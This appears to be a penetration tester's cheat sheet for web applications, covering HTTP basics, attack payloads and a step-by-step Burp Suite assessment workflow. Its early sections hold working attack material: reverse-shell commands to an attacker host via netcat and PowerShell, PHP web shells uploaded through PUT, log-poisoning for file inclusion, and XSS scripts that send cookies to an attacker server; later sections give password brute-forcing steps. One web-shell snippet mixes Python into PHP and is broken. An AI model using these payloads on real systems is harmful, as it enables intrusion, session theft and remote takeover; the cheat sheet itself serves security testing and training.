Web Apps


# HTTP Methods or Verbs

GET         Does not have a body and passes all parameters in the URL
POST        Send data to a server. Passes all parameters in the body of the request
PUT         Used for adding content to a web app, common with RESTful APIs
DELETE      Used for deleting content from a web app, common with RESTful APIs
HEAD        The web app will only return the response headers, not the body
OPTIONS     Show a list of HTTP options that the server supports
CONNECT     Set up a tunnel between a client and a server for SSL encryption or an HTTP proxy
TRACE       Used for debugging
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTTP Response Codes

100         Continue
200         OK
301         Moved Permanently
302         Found
304         Not Modified
400         Bad Request
401         Unauthorized
403         Forbidden
404         Not Found
500         Internal Server Error
------------------------------------------------------------------------------------------------------------------------------------------------------

# Browser Redirection

<iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
hacker:  use Metasploit browser autopwn
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cisco Router

x is between 15 and 99.
https://target IP/level/x/exec/-/show
------------------------------------------------------------------------------------------------------------------------------------------------------

# ColdFusion

/CFIDE/administrator/ 
/CFIDE/debug/cf_debugFr.cfm
/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
/debug/cf_debugFr.cfm
------------------------------------------------------------------------------------------------------------------------------------------------------

# Command Injection

http://target IP/test.php?cmd=whoami
http://target IP/test.php?cmd=nc -e /bin/sh <attacker IP> 443

- PHP command injection from a GET request
<?php echo system($_GET["cmd"]);?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cookie Security Issues - missing HttpOnly or Secure attribute

HttpOnly - prevents JavaScript from accessing the cookie
Secure - only send over an encrypted channel
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cookie Stealing

<script>alert(document.cookie)</script>

<script>new Image().src="http://<attacker IP>/test.php?"+ document.cookie;</script>
hacker: nc -lvp 80
------------------------------------------------------------------------------------------------------------------------------------------------------

# DOM

Document object model

Page Source - pre DOM
View Selection Source - post DOM
Inspector - post DOM
------------------------------------------------------------------------------------------------------------------------------------------------------

# File or PUT Upload Vuln

Create a PHP file called shell.php

<?php
$cmd=$_GET["cmd"];
$decode=base64_decode($cmd);
os.system($decode);
?>

curl -ikL -T shell.php http://<target IP>/shell.php
Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution

- Method 2
curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://<target IP>/shell.php

wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
------------------------------------------------------------------------------------------------------------------------------------------------------

# Fuzzing

When fuzzing headers, disable URL Encode.
When you are inside of a POST parameter, always use URL encoding.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Headers, Apache version, eTag, HTTP Basic Authentication Enabled

nc <target IP> 80
HEAD / HTTP/1.0
(hit enter 2x)

curl -ikL -X HEAD <target IP>

for i in `cat 80.txt` ; do curl -ikL -X HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTTP methods allowed

nc <target IP> 80
OPTIONS / HTTP/1.0
(hit enter 2x)

curl -ikL -X OPTIONS <target IP>
------------------------------------------------------------------------------------------------------------------------------------------------------

# iframe

<iframe src="http://<attacker IP>" width="1" height="1"></iframe>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Local File Inclusion

http://<target IP>/test.php?page=/etc/passwd

- method 2
nc <target IP> 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <target IP>
Connection: close

Send as cmd payload via http://<target IP>/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
------------------------------------------------------------------------------------------------------------------------------------------------------

# PHP version

nc <target IP> 80
GET / HEAD/1.0

http://<target IP>/aaaaa.php

Firefox > Web Developer Toolbar > Information > View Response Headers
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remote Code Execution

<?php system("nc 192.168.1.5 443 -e /bin/bash")?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remote File Inclusion

http://<target IP>/test.php?page=http://<attacker IP>/evil.txt

- method 2
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# URL Encoding

%20       space
%40   @   at
%26   &   ampersand
%28   (   open parenthesis
%29   )   close parenthesis
%3B   ;   semicolon
%22   "   double quote
%27   '   single quote
%3C   <   less than
%3E   >   greater than
%2E   .   period
%2F   /   forward slash

Example: <script>alert(document.cookie);</script>
Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
------------------------------------------------------------------------------------------------------------------------------------------------------

# WebDAV extensions are enabled

msfconsole
use auxiliary/scanner/http/webdav_scanner

./davtest.pl -url http://target-IP

for i in $(cat 80.txt); do cadaver -t $i; done
------------------------------------------------------------------------------------------------------------------------------------------------------

# WordPress

wpscan --url http://target --enumerate p --enumerate t --enumerate u
wpscan --url http://target -U users.txt -P passwords.txt

cd /usr/share/wpscan/
stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
------------------------------------------------------------------------------------------------------------------------------------------------------

# XML Injection

Single quote         foo'
Double quote         foo"
Greater than         foo>
Less than            foo<			
Comment tag          foo<!--
Ampersand            &foo
------------------------------------------------------------------------------------------------------------------------------------------------------

# XSS

Injection into the html on the page in a blog:  <h1>test</h1>
<script>alert(42)</script>
<script>alert(‘XSS’)</script>
Try using an HTML entity:  &lt;script&gt:

Stored - example: guestbook
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
<iframe SRC="http://<attacker IP>" height="0" width="0"></iframe>
<img src="http://<attacker IP>/doom.png" onload="javascript:alert('red team')"/>
<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>

curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`

# DOM Based XSS      <img src="x" onerror="alert(42)" />
# BeEF               <script> src = "http://<attacker IP>:3000/hook.js"></script>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Additional Guides

http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
------------------------------------------------------------------------------------------------------------------------------------------------------

# Example Assessment

- Initial recon
ping target.com
whois <IP>
whois target.com
dig target.com

- Service enumeration
nmap -Pn -n -T4 --open -p- -A -sC target.com
nmap -Pn -n -T4 --open -sU -A target.com
wafw00f https://www.target.com
whatweb https://target.com

- SSL/TLS enumeration
sslscan https://target.com
sslyze https://target.com

- Default configurations and files
nikto -h https://target.com -port 443 -Format htm --output target.htm

- Application specific enumeration
davtest -url https://target.com
droopescan scan drupal -u https://target.com
joomscan -u https://target.com
uniscan -u https://www.target.com -qweds
wpscan --url https://target.com --enumerate vp,vt,cb,u,m

- Bruteforce directories
dirb https://target.com -r -z 10
gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50
gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php

- Install Firefox Add-ons
Firefox > Preferences > Add-ons > type Wappalyzer > click on the search result > Add to Firefox > Add
Repeat steps for Web Developer

- Configure proxy
Firefox > Preferences > Network Settings > select Manual proxy configurtion
HTTP Proxy: 127.0.0.1
Port: 8080
Check Use this proxy server for all protocols > OK
------------------------------------------------------------------------------------------------------------------------------------------------------

# Setup Burp Suite Pro

Open Burp
New project on disk > Choose file > burp-project > Save
Name: Base
Next
Use Burp defaults > Start Burp

- Import Burp certificate into Firefox

Open Firefox to http://burp
CA Certificate > Save File > OK
Preferences > Options > Privacy & Security > View Certificates > Authorities > Import
Select the certificate that you previously downloaded > Open
Enable Trust this CA to identify websites > OK > OK
Restart Firefox

- Configure Burp options

Open Burp > New project on disk > Name: burp-base
Choose file > burp-base.burp > Save > Next > Sub Burp default > Start Burp
Target > Site map:
    Right click on any pane > View > Tabs
    Filter > click on the gear > Restore defaults > click out of the Filter

Proxy > Options > Intercept Client Requests:
    Enable URL and click Up to move to the top
    Select File extension > Edit: add jpeg
    Copy the contents > OK

Proxy > Options > Intercept Server Responses:
    Enable Intercept responses based on the following rules
    Disable Content type header
    Enable URL and use the Up botton to move to the top
    Add: And, File extension, Does not match, Match condition: paste contents from above, OK

Match & Replace
    Scroll to the bottom and enable X-XXS-Protection: 0

Intruder > Options > Request Engine
    Number of threads: 8
    Number of retries on network failure: 2

Extender > BApp Store > Refresh list > install the following extensions:
    Active Scann++, Additional Scanner Checks, Backslash Powered Scanner, CO2, CSRF Scanner,
    Error Message Checks, J2EEScan, Java Deserialization Scanner, JSON Beautifier, Paramalyzer,
    Retire.js, Site Map Fetcher, Software Version Reporter, Software Vulnerability Scanner, Wsdler
    and XSS Validator

Options > Python Environment > Select file > Browse to /Applications/jython-standalone-2.7.0.jar > Open

Project options > Misc > Burp Collaborator Server: Don't use Burp Collaborator

User options > Connections > Platform Authentication > enable Prompt for credentials on platform authentication failure

User options > Display
    User Interface > Font size: 14
    HTTP Message Display > Font: Courier 14

User options > Misc > Proxy Interception: Always disable

Burp menu > User options > Save user options: burp-user

This will provide you a starting point for all future scans.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Testing from home? Tunnel all your traffic over SSH to Kali running in Amazon EC2.

ssh -i amazon.pem ec2-user@kaliIP
sudo -i
vim /etc/proxychains.conf
Add a new last line: socks5 127.0.0.1 1080
exit
exit

ssh -D 1080 -f -N -i amazon.pem ec2-user@kaliIP

Open Burp locally.
User options > Connections > SOCKS Proxy
Check Use SOCKS proxy
SOCKS Proxy host: 127.0.0.1
SOCKS Proxy port: 1080
Check Do DNS lookups over SOCKS proxy

Open Firefox to http://whatismyipaddress.com
The IP address should be your Kali EC2.
Target > Site map: this should now populate
------------------------------------------------------------------------------------------------------------------------------------------------------

- New scan
Copy burp-base.burp to the Desktop.
Rename the file (client.burp)
Open Burp > Open existing project > Choose file > Desktop > client.burp > open > Next
Load from configuration file > Choose file > find your user prefs > Open > Next
Dashboard > Resume

- Establish scope
Open Firefox > surf to the target site
Target  > the Site map should be populating
Right click on the target URL > Add to scope
Filter > enable Show only in-scope items > Filter
Target > Scope > you will see the URL listed in the top window

- Browse the target
Look for target.com/sitemap and target.com/robots.txt
Browse every link on each page.
If not present, click on every link on the homepage.
Continue until you have thoroughly browsed the target.

- Brute force directories
Target > Site map > right click on the second line '/' > Send to Intruder
Intruder > Position > Attack type: Sniper
Clear §
On the top line, select the forward slash '/' after GET > Add §
Move the forward slash in front of the two symbols. It should look like: GET /§§
Payloads > Payload Sets > Payload set: 1 > Payload type: Runtime file
Payloads > Payload Options > Select file > raft-medium-directories.txt > Open
Start attack

- Sync results to Site map
Scroll to the top of the list > sort by Payload
Delete any blanks lines
Move the Intruder window to the side so you can see the main window
Target > Site map
Compare the pages in the Site map to the Payloads in the Intruder window.
Select a Payload that is not listed in the Site map
Right click > Request in browser > In current session
Enable In future, just copy the URL and don't show this dialog > Copy
Open a new tab in Firefox and paste.
Repeat as necessary.

- Analyze anomolies
Filter > uncheck 4xx [request error] > Filter
Click Status to sort by ascending.
Select the first line with a 302 Status.
Hold down shift and select the last line with a 302 Status.
Right click > Delete selected items > Yes
Review uncomman HTTP status codes (5xx) > Response > Render
Sort by Length, review minimum and maximum values > Response > Render

- Review comments
Target > Site map > right click on the target URL > Engagement tools > Find comments
Sort by Item
Select each line > Response > right arrow key > look for sensitive information.

- Visit referenced URLs
Target > Site map > right click on the target URL > Expand branch
Scroll to the very bottom.
Right click on any empty folders that are greyed out > Delete branch > Yes
Right click on any pages that are grey or red > Copy URL > Firefox > Paste & Go
Skip pages that end with css, jpg, js, pdf or png.
Make sure at least one page has been visited under each folder.
Select multiple URLs by holding down shift > right click > Copy selected URLs
Firefox > select the + on the far right to access 'Open Multiple URLs' > paste > Open URLs
Burp > once the URLs become black > Firefox > close the open tabs.

- Scan the target
Target > Site map > right click on the target URL > Actively scan this host

- Capture a packet
Burp > Proxy > enable intercept
Firefox > try to login to a web page.
Burp > right click on capture > Send to Intruder
Intruder > Position > Attack type

- Types of attack
Sniper:
    Uses a single wordlist against a single variable.
Battering ram:
    Uses a single wordlist against all variables.
Pitchfork:
    Uses multiple wordlists.
    For example: you have a known list of usernames and a related list of passwords.
    This will try the first username with the first password, then the second username with the second password, and so on.
    This is useful when checking for old accounts that should have been deleted.
Cluster bomb:
    Uses multiple wordlists.
    For example: you have a known list of usernames and a non-related list of passwords.
    This will try the first username with each password, then the second username with each password, and so on.

- Brute force a password: Sniper
    Clear $
    Highlight the password you entered > Add $
    Intruder > Payloads > Payload Options
    Load > choose a password list > Open
    Start attack
    Filter > uncheck 4xx [request error] > Filter
    Click Status to sort by ascending.
    Look for a 302 (redirect). This should be a successful login.

- Brute force usernames and passwords: Cluster bomb
    Clear $
    Highlight the username you entered > Add $
    Highlight the password you entered > Add $
    Intruder > Payloads > Payload Sets
        Payload set: 1
        Payload type: Simple list
    Intruder > Payloads > Payload Options
    Clear > Load > choose a username list > Open
    Intruder > Payloads > Payload Sets
        Payload set: 2
        Payload type: Simple list
    Intruder > Payloads > Payload Options
    Clear > Load: choose a password list > Open
    Start attack
    Filter > uncheck 4xx [request error] > Filter
    Click Status to sort by ascending.
    Look for a 302 (redirect). This should be a successful login.

- Other methods
Hydra
    hydra -L users.txt -P pass.txt <target IP> http-get

Metasploit
    use auxiliary/scanner/http/http_login
    set user_file user.txt
    set pass_file pass.txt
    set rhosts <target IP>
    set stop_on_success true
    exploit
------------------------------------------------------------------------------------------------------------------------------------------------------

# Check for 404 and 500 errors

Add junk to the middle of a URL.
Add a single tick (') at the end of a URL.
Enter a single tick (') in any input field of a form and submit.
------------------------------------------------------------------------------------------------------------------------------------------------------

# CSRF

Login to the target.
Create a list of all POST requests that do not have a unique token called ‘CSRF_Token’.

Proxy > HTTP history > Filter > Filter by search term
    ^POST((?!CSRF_Token).)*$
    Click Regex

Right click on the first request > Engagement tools > Generate CSRF PoC
Test in browser > Copy
Open a new tab in Firefox > paste
Look for evidence that it executed whatever that HTTP request was supposed to do.

https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
------------------------------------------------------------------------------------------------------------------------------------------------------

# Manually Validate Findings

File path traversal: right click in the Request body > Send to Repeater > modify the request
XML Injection: Search in the Response body for http://www.w3.org/2001/XMLSchema.
This is a false positive.
XSS: right click in the Request body > Request in browser > In current browser session
------------------------------------------------------------------------------------------------------------------------------------------------------

# Mobile app testing

Proxy > Options > Proxy Listeners > Add > Binding:
    Bind to port: 8081
    Bind to address: All interfaces
    OK > Yes

iPhone: Settings > Wi-Fi > select your network > scroll to the bottom
HTTP PROXY > Manual
    Server: your computer's IP address.
    Port: 8081

Safari > http://burp
    Select CA Certificate
    It will prompt you to install, then ask for your password
------------------------------------------------------------------------------------------------------------------------------------------------------

# Reporting

Removed false positives.
Select all remaining findings.
Right click > Report selected issues > Next 4x > enter file location > Next > Close
------------------------------------------------------------------------------------------------------------------------------------------------------

Right click on the very first request >  Send to intruder
Clear
Put your curser right after the / > click Add
Payload Sets > Payload type: Runtime file
Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
Start attack
sort by Status
    500  Server message
    405  Method not allowed

- User-Agent Switcher
Intruder > clear > select user agent string > Add
Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
Sort by Length > Response > Render

